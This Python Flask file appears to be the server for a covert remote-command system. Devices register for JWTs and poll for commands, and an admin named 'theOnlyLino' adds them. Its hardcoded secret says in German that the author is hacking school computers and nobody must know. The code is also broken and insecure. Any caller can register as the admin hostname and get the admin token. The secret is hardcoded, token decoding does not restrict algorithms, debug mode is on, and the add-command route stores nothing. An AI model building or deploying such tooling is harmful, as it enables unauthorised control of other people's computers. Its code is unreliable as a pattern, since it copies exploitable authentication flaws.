from operator import attrgetter

from flask import Flask, make_response, request
import management
import jwt

from management import Device

SECRET = "iCH hAcKe scHuLcomPuTer, aBer das DaRf niemAnd wIsSen!1!"
DEVICES_STORAGE_LOCATION = "devices.txt"

devices = management.DeviceStorage.load_devices(DEVICES_STORAGE_LOCATION)

app = Flask(__name__)

@app.post("/register")
def register():
    hostname = request.get_data().decode()
    token = jwt.encode({"sub": hostname}, SECRET, "HS256")
    devices.devices.append(Device(hostname))
    print(devices.devices[-1].hostname)
    return token

@app.get("/active")
def active():
    return make_response(devices.active())

@app.post("/active/<device_hostname>")
def activate(device_hostname):
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            devices[device_hostname].active = True

@app.post("/inactive/<device_hostname>")
def inactivate(device_hostname):
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            devices[device_hostname].active = False


@app.post("/commands/add/<device_hostname>")
def add_command(device_hostname):
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            request.get_data()

@app.get("/commands/get")
def get_command():
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET)
        print(f"Decoded payload: {payload}")
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        device_hostname = payload["sub"]
        print(f"Looking for device: {device_hostname}")

        # Verwende get_device, um das Gerät zu finden
        device = devices.get_device(device_hostname)
        if not device:
            print(f"Device {device_hostname} not found in devices.")
            return "DEVICE NOT FOUND", 404

        return device.get().export_to_string()

if __name__ == '__main__':
    app.run(debug=True)
